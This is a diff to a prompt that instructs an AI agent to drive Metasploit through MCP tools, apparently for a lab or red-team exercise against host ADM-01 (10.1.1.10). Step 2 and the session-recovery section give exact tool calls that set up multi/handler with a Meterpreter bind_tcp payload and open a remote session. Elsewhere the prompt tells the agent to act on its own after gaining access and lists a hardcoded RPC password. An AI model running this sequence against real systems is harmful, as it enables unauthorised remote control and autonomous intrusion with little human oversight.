@@ -14,21 +14,35 @@ Do not call anything else until connect succeeds.
 
 **STEP 2 — Run the exploit handler to establish a session**
 There is NO active session yet. You MUST create one. The target machine ADM-01 (10.1.1.10) has a Meterpreter bind_tcp payload already running on port 4444, but nothing is connected to it yet. You need to start a handler that reaches out and connects to that payload.
-The following calls must be made for this to occur:
-```
-use_module("exploit", "multi/handler")
-set_module_option("exploit", "multi/handler", "PAYLOAD", "windows/x64/meterpreter/bind_tcp")
-set_module_option("exploit", "multi/handler", "LPORT", 4444)
-set_module_option("exploit", "multi/handler", "RHOST", "10.1.1.10")
-get_missing_required("exploit", "multi/handler")   # sanity check before firing
-execute_module("exploit", "multi/handler", payload="windows/x64/meterpreter/bind_tcp")
-list_sessions()
-```
 
-Call `mcp-pymetasploit3__execute_module` with these EXACT args:
-```
-{"module_type": "exploit", "module_name": "multi/handler", "PAYLOAD": "windows/x64/meterpreter/bind_tcp", "RHOST": "10.1.1.10", "LPORT": "4444"}
-```
+You MUST make the following calls IN THIS EXACT ORDER, one at a time. Do NOT skip any. Do NOT combine them into a single call.
+
+1. Load the handler module:
+   Tool: `mcp-pymetasploit3__use_module`
+   Args: `{"module_type": "exploit", "module_name": "multi/handler"}`
+
+2. Set the PAYLOAD option FIRST (other options depend on this):
+   Tool: `mcp-pymetasploit3__set_module_option`
+   Args: `{"module_type": "exploit", "module_name": "multi/handler", "option_name": "PAYLOAD", "option_value": "windows/x64/meterpreter/bind_tcp"}`
+
+3. Set the target port:
+   Tool: `mcp-pymetasploit3__set_module_option`
+   Args: `{"module_type": "exploit", "module_name": "multi/handler", "option_name": "LPORT", "option_value": "4444"}`
+
+4. Set the target host:
+   Tool: `mcp-pymetasploit3__set_module_option`
+   Args: `{"module_type": "exploit", "module_name": "multi/handler", "option_name": "RHOST", "option_value": "10.1.1.10"}`
+
+5. Verify nothing is missing:
+   Tool: `mcp-pymetasploit3__get_missing_required`
+   Args: `{"module_type": "exploit", "module_name": "multi/handler"}`
+
+6. Execute the module — ONLY module_type, module_name, and payload. NO other args:
+   Tool: `mcp-pymetasploit3__execute_module`
+   Args: `{"module_type": "exploit", "module_name": "multi/handler", "payload": "windows/x64/meterpreter/bind_tcp"}`
+
+IMPORTANT: `execute_module` accepts ONLY `module_type`, `module_name`, and `payload`. It does NOT accept PAYLOAD, RHOST, LPORT, options, or any other parameter. All module options MUST be set beforehand using `set_module_option`. If you pass anything other than module_type, module_name, and payload to execute_module, it WILL fail.
+
 This is the same as running these commands in msfconsole:
 ```
 use exploit/multi/handler
@@ -78,20 +92,28 @@ From here you have initial access on target ADM-01 (10.1.1.10). Act on your own 
 ### IF A SESSION DIES
 If `session_run_command` returns errors or the session stops responding:
 1. Call `mcp-pymetasploit3__list_sessions` with args `{}` to check what sessions exist.
-2. If no sessions are listed, run the handler again — same as Step 2:
-   `mcp-pymetasploit3__execute_module` with args:
-   `{"module_type": "exploit", "module_name": "multi/handler", "PAYLOAD": "windows/x64/meterpreter/bind_tcp", "RHOST": "10.1.1.10", "LPORT": "4444"}`
+2. If no sessions are listed, run the handler again — same sequence as Step 2:
+   a. `mcp-pymetasploit3__use_module` with args `{"module_type": "exploit", "module_name": "multi/handler"}`
+   b. `mcp-pymetasploit3__set_module_option` with args `{"module_type": "exploit", "module_name": "multi/handler", "option_name": "PAYLOAD", "option_value": "windows/x64/meterpreter/bind_tcp"}`
+   c. `mcp-pymetasploit3__set_module_option` with args `{"module_type": "exploit", "module_name": "multi/handler", "option_name": "LPORT", "option_value": "4444"}`
+   d. `mcp-pymetasploit3__set_module_option` with args `{"module_type": "exploit", "module_name": "multi/handler", "option_name": "RHOST", "option_value": "10.1.1.10"}`
+   e. `mcp-pymetasploit3__execute_module` with args `{"module_type": "exploit", "module_name": "multi/handler", "payload": "windows/x64/meterpreter/bind_tcp"}`
 3. Wait a couple of minutes, then call `list_sessions` again. When a new session appears, note its NEW integer ID and continue with `session_run_command` using that new ID.
 
 ### AVAILABLE TOOLS — USE EXACT NAMES BELOW
 You have 6 tools you should use. Use the FULL name with the prefix.
 
 1. `mcp-pymetasploit3__connect` — Connect to Metasploit RPC. Args: `{"host": "127.0.0.1", "port": 55553, "password": "password123", "ssl": true}`. Call ONCE at start.
-2. `mcp-pymetasploit3__execute_module` — Run a Metasploit module. Used in Step 2 to start the handler, and later for network scanning. Args: `{"module_type": "exploit", "module_name": "multi/handler", "PAYLOAD": "windows/x64/meterpreter/bind_tcp", "RHOST": "10.1.1.10", "LPORT": "4444"}`.
+2. `mcp-pymetasploit3__execute_module` — Execute a loaded Metasploit module. Args: `{"module_type": "exploit", "module_name": "multi/handler", "payload": "windows/x64/meterpreter/bind_tcp"}`. ONLY these three args — all module options (PAYLOAD, RHOST, LPORT) must be set beforehand with `set_module_option`.
 3. `mcp-pymetasploit3__list_sessions` — List all active sessions. Args: `{}`. Use to find session IDs and check if sessions are alive.
 4. `mcp-pymetasploit3__session_run_command` — Run a command in a Meterpreter session and get output back. Args: `{"session_id": 1, "command": "<meterpreter command>"}`. THIS IS YOUR MAIN TOOL after session is established.
 5. `mcp-pymetasploit3__get_session_info` — Get details about a session. Args: `{"session_id": 1}`.
 6. `mcp-pymetasploit3__stop_session` — Kill a session. Args: `{"session_id": 1}`.
+
+Additionally, these tools are used in Step 2 to configure the handler before execution:
+7. `mcp-pymetasploit3__use_module` — Load a module before setting options or executing. Args: `{"module_type": "exploit", "module_name": "multi/handler"}`.
+8. `mcp-pymetasploit3__set_module_option` — Set ONE option on a loaded module. Args: `{"module_type": "exploit", "module_name": "multi/handler", "option_name": "PAYLOAD", "option_value": "windows/x64/meterpreter/bind_tcp"}`.
+9. `mcp-pymetasploit3__get_missing_required` — Check if any required options are unset. Args: `{"module_type": "exploit", "module_name": "multi/handler"}`.
 
 Do NOT use any other tools. If a tool returns an error, do NOT repeat the same call — change your approach.
 
@@ -101,6 +123,7 @@ Do NOT use any other tools. If a tool returns an error, do NOT repeat the same c
 3. `ssl` is always a BOOLEAN: `true` not `"true"`
 4. Tool names use the server prefix with double underscore: `mcp-pymetasploit3__session_run_command`
 5. If a tool returns an error, do NOT repeat the same call. Change your approach.
+6. `execute_module` accepts ONLY `module_type`, `module_name`, and `payload`. Never pass RHOST, LPORT, PAYLOAD, options, or anything else to it.
 
 ### METERPRETER COMMANDS YOU CAN USE WITH session_run_command
 These are commands you pass as the "command" string. They run directly in Meterpreter — no shell wrapper needed:
